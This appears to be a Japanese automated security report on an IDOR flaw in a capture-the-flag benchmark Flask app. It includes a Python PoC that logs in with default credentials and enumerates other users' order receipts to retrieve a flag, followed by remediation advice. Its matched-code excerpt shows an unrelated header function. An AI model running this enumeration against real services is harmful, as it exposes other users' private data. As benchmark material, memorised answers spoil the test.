# Security Analysis: routes.py - HTTP request handlers

## ファイル情報

- **ファイルパス**: `benchmarks/benchmarks/XBEN-001-24/app/website/app/routes.py`
- **検出パターン**: HTTP request handlers

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 100**

## 脆弱性タイプ

- `IDOR`

## PAR Policy Analysis

### Principals (データ源)

- **order_id**: Untrusted
  - Context: URLパスパラメータ (/order/<int:order_id>/receipt) からユーザーが直接指定
  - Risk Factors: ユーザー制御可能な入力, 連番IDのため推測が容易, 入力検証なし
- **session['user_id']**: SemiTrusted
  - Context: ログイン成功時にセッションに保存されるユーザーID
  - Risk Factors: 認証には使用されるが、認可確認に活用されていない

### Actions (セキュリティ制御)

- **session.get('user_id')**: Insufficient
  - Function: 認証チェック - ユーザーがログインしているかの確認
  - Weaknesses: 認証のみで認可チェックがない, 注文がリクエスト元ユーザーに属するかの確認なし
  - Bypass Vectors: ログインしている任意のユーザーが、他のユーザーの注文IDを指定することで認可をバイパス

### Resources (操作対象)

- **Order.query.get(order_id)**: High
  - Operation: データベース読み取り - 注文情報（領収書含む）の取得
  - Protection: 認証チェック（ログイン必須）のみ
- **order.receipt**: Critical
  - Operation: 機密データ表示 - フラグ情報を含む可能性がある領収書
  - Protection: 

### Policy Violations

#### AUTHZ-001: リソースへのアクセスには所有者確認（認可チェック）が必要

- **Path**: order_id (URLパラメータ) -> session.get('user_id') [認証のみ] -> Order.query.get(order_id) -> receipt表示
- **Severity**: critical
- **Confidence**: 1.00

#### SEC-002: 機密データ（フラグ）は適切なアクセス制御の下に保護されるべき

- **Path**: 任意の認証済みユーザー -> /order/300401/receipt -> フラグ情報漏洩
- **Severity**: critical
- **Confidence**: 1.00

## マッチしたソースコード

```code
def add_header(request):
    request.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    request.headers['Pragma'] = 'no-cache'
    request.headers['Expires'] = '0'
    request.headers['Cache-Control'] = 'public, max-age=0'
    return request
```

## 詳細解析

このFlaskアプリケーションには、`order_receipt()` ルート（94-109行目）に**重大なIDOR脆弱性**が存在します。

**問題点:**
1. ユーザーがURLパラメータ `order_id` を通じて任意の注文IDを指定可能
2. セッションから `user_id` を取得しているが、**注文の所有者確認を行っていない**
3. `Order.query.get(order_id)` で直接データベースから注文を取得し、レスポンスとして返却

**影響:**
- 認証済みユーザーは、他のユーザーの注文領収書を閲覧可能
- `__init__.py` で作成された `order_id=300401` には機密情報（フラグ）が含まれており、これにも直接アクセス可能

**追加のセキュリティ問題:**
1. デフォルト認証情報: test/test でログイン可能
2. パスワードが平文で保存されている
3. `app.secret_key = 'your_secret_key'` がハードコードされている

## PoC（概念実証コード）

```text
# IDOR脆弱性のPoC (Proof of Concept)

import requests

# ターゲットURLを設定
BASE_URL = 'http://localhost:5000'

# セッションを作成
session = requests.Session()

# Step 1: デフォルト認証情報でログイン
# ログインページにPOST
login_response = session.post(f'{BASE_URL}/', data={
    'username': 'test'
})

# Step 2: パスワードページにPOST
password_response = session.post(f'{BASE_URL}/password/test', data={
    'password': 'test'
})

# Step 3: IDOR攻撃 - 他のユーザーの注文やフラグを含む注文にアクセス
# フラグを含む注文ID: 300401
flag_order_response = session.get(f'{BASE_URL}/order/300401/receipt')

print('=== IDOR Vulnerability PoC ===')
print(f'Status Code: {flag_order_response.status_code}')
print(f'Response contains flag: {"FLAG" in flag_order_response.text}')
print(f'Response (first 500 chars): {flag_order_response.text[:500]}')

# 他のユーザーの注文にも順次アクセス試行
print('\n=== Enumerating other order IDs ===')
for order_id in [300123, 300214, 300327, 300481, 300401]:
    resp = session.get(f'{BASE_URL}/order/{order_id}/receipt')
    print(f'Order {order_id}: Status {resp.status_code}')
```

## 修復ガイダンス

### order_receipt() 関数

- **Required**: 注文の所有者確認（認可チェック）の追加
- **Guidance**: Order取得後に `if order.user_id != user_id: abort(403)` のような認可チェックを実装する。または `Order.query.filter_by(id=order_id, user_id=user_id).first_or_404()` で取得時にフィルタリングする。
- **Priority**: critical

### パスワード保存

- **Required**: パスワードのハッシュ化
- **Guidance**: werkzeug.security.generate_password_hash() を使用してパスワードをハッシュ化して保存する
- **Priority**: high

### app.secret_key

- **Required**: シークレットキーの安全な管理
- **Guidance**: 環境変数から読み込むか、secrets.token_hex() で生成したランダムなキーを使用する
- **Priority**: high

### デフォルト認証情報

- **Required**: テスト用アカウントの削除または強力なパスワードへの変更
- **Guidance**: 本番環境では test/test のようなデフォルト認証情報を使用しない
- **Priority**: medium

## 解析ノート

routes.py の order_receipt() 関数を分析。ユーザーがURLから order_id を渡すと、Order.query.get(order_id) でデータベースから注文を取得するが、その注文が現在ログインしているユーザーに属するかの確認が行われていない。__init__.py を確認すると、フラグを含む Order（id=300401）が作成されており、これは特定のユーザーに紐づいていない（user=None）。攻撃者は test/test でログイン後、/order/300401/receipt にアクセスすることでフラグを取得できる。

